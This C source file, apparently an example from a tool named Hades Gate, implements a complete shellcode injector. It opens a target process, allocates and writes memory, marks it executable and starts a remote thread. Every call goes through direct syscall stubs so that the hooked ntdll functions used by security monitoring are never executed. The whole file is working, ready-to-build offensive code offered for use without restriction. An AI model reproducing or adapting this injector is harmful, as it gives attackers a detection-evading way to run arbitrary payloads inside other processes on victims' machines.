/*
 * injector.c — Complete unhooked injection chain via Hades Gate
 *
 * Demonstrates: NtOpenProcess → NtAllocateVirtualMemory →
 *   NtWriteVirtualMemory → NtProtectVirtualMemory → NtCreateThreadEx
 *
 * All calls go through direct syscall stubs. Zero Win32 API calls.
 * Zero hooked ntdll functions executed.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -Os -masm=intel \
 *       src/hades_gate.c examples/injector.c -o injector.exe
 *
 * Usage:
 *   injector.exe <PID> <shellcode.bin>
 *
 * This file is part of Hades Gate.
 * License: None / Do What Thou Wilt.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "../src/hades_gate.h"

/* ------------------------------------------------------------------ */
/* NT API prototypes — we'll fill these with our clean stubs          */
/* ------------------------------------------------------------------ */

typedef NTSTATUS (NTAPI* pNtOpenProcess)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, CLIENT_ID*);

typedef NTSTATUS (NTAPI* pNtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

typedef NTSTATUS (NTAPI* pNtWriteVirtualMemory)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

typedef NTSTATUS (NTAPI* pNtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

typedef NTSTATUS (NTAPI* pNtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG,
    SIZE_T, SIZE_T, SIZE_T, PVOID);

typedef NTSTATUS (NTAPI* pNtClose)(HANDLE);

typedef NTSTATUS (NTAPI* pNtDelayExecution)(BOOLEAN, PLARGE_INTEGER);

/* ------------------------------------------------------------------ */
/* Load shellcode from file                                           */
/* ------------------------------------------------------------------ */
static unsigned char* load_file(const char* path, SIZE_T* out_size) {
    FILE* f = fopen(path, "rb");
    if (!f) { perror("fopen"); return NULL; }

    fseek(f, 0, SEEK_END);
    *out_size = ftell(f);
    fseek(f, 0, SEEK_SET);

    unsigned char* buf = (unsigned char*)malloc(*out_size);
    if (!buf) { fclose(f); return NULL; }

    if (fread(buf, 1, *out_size, f) != *out_size) {
        free(buf);
        fclose(f);
        return NULL;
    }

    fclose(f);
    return buf;
}

/* ------------------------------------------------------------------ */
/* Main                                                               */
/* ------------------------------------------------------------------ */
int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("Usage: %s <PID> <shellcode.bin>\n", argv[0]);
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    SIZE_T sc_size = 0;
    unsigned char* shellcode = load_file(argv[2], &sc_size);
    if (!shellcode) {
        fprintf(stderr, "Failed to load shellcode from %s\n", argv[2]);
        return 1;
    }

    printf("[*] Target PID: %lu\n", pid);
    printf("[*] Shellcode size: %zu bytes\n", sc_size);

    /* ------------------------------------------------------------------ */
    /* Resolve all Nt* functions via Hades Gate                            */
    /* ------------------------------------------------------------------ */
    printf("[*] Resolving syscall stubs...\n");

    pNtOpenProcess           NtOpenProcess
        = (pNtOpenProcess)hg_syscall("NtOpenProcess");
    pNtAllocateVirtualMemory NtAllocateVirtualMemory
        = (pNtAllocateVirtualMemory)hg_syscall("NtAllocateVirtualMemory");
    pNtWriteVirtualMemory    NtWriteVirtualMemory
        = (pNtWriteVirtualMemory)hg_syscall("NtWriteVirtualMemory");
    pNtProtectVirtualMemory  NtProtectVirtualMemory
        = (pNtProtectVirtualMemory)hg_syscall("NtProtectVirtualMemory");
    pNtCreateThreadEx        NtCreateThreadEx
        = (pNtCreateThreadEx)hg_syscall("NtCreateThreadEx");
    pNtClose                 NtClose
        = (pNtClose)hg_syscall("NtClose");
    pNtDelayExecution        NtDelayExecution
        = (pNtDelayExecution)hg_syscall("NtDelayExecution");

    if (!NtOpenProcess || !NtAllocateVirtualMemory || !NtWriteVirtualMemory ||
        !NtProtectVirtualMemory || !NtCreateThreadEx || !NtClose) {
        fprintf(stderr, "[-] Failed to resolve one or more syscall stubs\n");
        return 1;
    }

    /* Verify all stubs are executing from non-ntdll memory */
    printf("[*] All stubs resolved successfully\n\n");

    /* ------------------------------------------------------------------ */
    /* Step 1: NtOpenProcess                                              */
    /* ------------------------------------------------------------------ */
    HANDLE hProcess = NULL;
    CLIENT_ID cid = { (HANDLE)(ULONG_PTR)pid, NULL };
    OBJECT_ATTRIBUTES oa = { sizeof(oa) };

    printf("[*] Opening process %lu...\n", pid);
    NTSTATUS status = NtOpenProcess(
        &hProcess,
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ |
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_SUSPEND_RESUME,
        &oa, &cid);

    if (status < 0 || !hProcess) {
        fprintf(stderr, "[-] NtOpenProcess failed: 0x%08lX\n", status);
        return 1;
    }
    printf("[+] Process handle: 0x%p\n", (void*)hProcess);

    /* ------------------------------------------------------------------ */
    /* Step 2: NtAllocateVirtualMemory in target                          */
    /* ------------------------------------------------------------------ */
    PVOID remote_addr = NULL;
    SIZE_T alloc_size = sc_size;

    printf("[*] Allocating %zu bytes in target...\n", alloc_size);
    status = NtAllocateVirtualMemory(
        hProcess, &remote_addr, 0, &alloc_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);  // ← RW, not RWX. We'll change executable afterwards.

    if (status < 0 || !remote_addr) {
        fprintf(stderr, "[-] NtAllocateVirtualMemory failed: 0x%08lX\n", status);
        NtClose(hProcess);
        return 1;
    }
    printf("[+] Remote address: 0x%p\n", remote_addr);

    /* ------------------------------------------------------------------ */
    /* Step 3: NtWriteVirtualMemory                                       */
    /* ------------------------------------------------------------------ */
    SIZE_T bytes_written = 0;

    printf("[*] Writing shellcode...\n");
    status = NtWriteVirtualMemory(
        hProcess, remote_addr, shellcode, sc_size, &bytes_written);

    if (status < 0 || bytes_written != sc_size) {
        fprintf(stderr, "[-] NtWriteVirtualMemory failed: 0x%08lX\n", status);
        NtClose(hProcess);
        return 1;
    }
    printf("[+] Wrote %zu bytes\n", bytes_written);

    /* ------------------------------------------------------------------ */
    /* Step 4: NtProtectVirtualMemory → PAGE_EXECUTE_READ                 */
    /* ------------------------------------------------------------------ */
    ULONG old_protect = 0;
    PVOID protect_addr = remote_addr;
    SIZE_T protect_size = sc_size;

    printf("[*] Changing memory to PAGE_EXECUTE_READ...\n");
    status = NtProtectVirtualMemory(
        hProcess, &protect_addr, &protect_size,
        PAGE_EXECUTE_READ, &old_protect);

    if (status < 0) {
        fprintf(stderr, "[-] NtProtectVirtualMemory failed: 0x%08lX\n", status);
        NtClose(hProcess);
        return 1;
    }
    printf("[+] Protection changed from 0x%08lX to PAGE_EXECUTE_READ\n",
           old_protect);

    /* ------------------------------------------------------------------ */
    /* Step 5: NtCreateThreadEx                                           */
    /* ------------------------------------------------------------------ */
    HANDLE hThread = NULL;

    printf("[*] Creating remote thread...\n");
    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        remote_addr,    // start address (our shellcode)
        NULL,           // argument
        0,              // flags
        0,              // stack size (0 = default)
        0,              // max stack size
        0,              // initial thread attributes
        NULL);

    if (status < 0 || !hThread) {
        fprintf(stderr, "[-] NtCreateThreadEx failed: 0x%08lX\n", status);
        NtClose(hProcess);
        return 1;
    }
    printf("[+] Remote thread: 0x%p\n", (void*)hThread);

    /* ------------------------------------------------------------------ */
    /* Cleanup                                                            */
    /* ------------------------------------------------------------------ */
    printf("[*] Waiting 1 second for shellcode to execute...\n");

    LARGE_INTEGER delay;
    delay.QuadPart = -10000000LL; // 1 second in 100ns intervals
    NtDelayExecution(FALSE, &delay);

    NtClose(hThread);
    NtClose(hProcess);
    free(shellcode);

    printf("[+] Injection complete\n");
    return 0;
}
